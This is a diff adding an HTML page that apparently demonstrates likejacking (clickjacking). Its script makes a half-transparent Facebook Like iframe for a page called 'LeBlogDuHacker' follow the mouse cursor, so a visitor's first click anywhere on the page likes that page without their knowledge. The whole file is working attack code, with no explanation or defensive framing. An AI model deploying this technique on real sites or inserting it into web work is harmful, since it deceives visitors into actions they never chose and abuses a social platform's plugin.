@@ -1,0 +1,45 @@
+<html>
+<head>
+    <script type="text/javascript" src="http://code.jquery.com/jquery.min.js"></script>
+	<script type="text/javascript">
+        var x = '';
+        var y = '';
+        var iFrame = '';
+    
+        $(document).ready(function() {
+            var src = $("#ifrfb").attr('src');
+        
+            if (src.indexOf('plugins/like.php') > 0) {   
+                iFrame = $("#ifrfb");
+            }
+
+            $(window).click(function() {
+                $(document).unbind('mousemove');
+                iFrame.remove();
+            });
+        });
+        
+        $(document).mousemove(function(e){
+            x = e.pageX;
+            y = e.pageY;
+        
+            if (iFrame != '') {
+                var offTop = y-10;
+                var offLeft = x-25;  
+                $(iFrame).offset({ top: offTop, left: offLeft });
+            }
+        });
+	</script>
+</head>
+<body>
+
+    
+    <iframe id="ifrfb" src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Fwww.facebook.com%2FLeBlogDuHacker&amp;send=false&amp;layout=button_count&amp;width=450&amp;show_faces=false&amp;font&amp;colorscheme=light&amp;action=like&amp;height=21&amp;appId=535151036681055" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:85px; height:21px;" allowTransparency="true"></iframe>
+    
+    <style>
+        #ifrfb {opacity:0.5}
+    </style>
+
+    <script src="dist/bundle.min.js"></script>
+</body>
+</html>
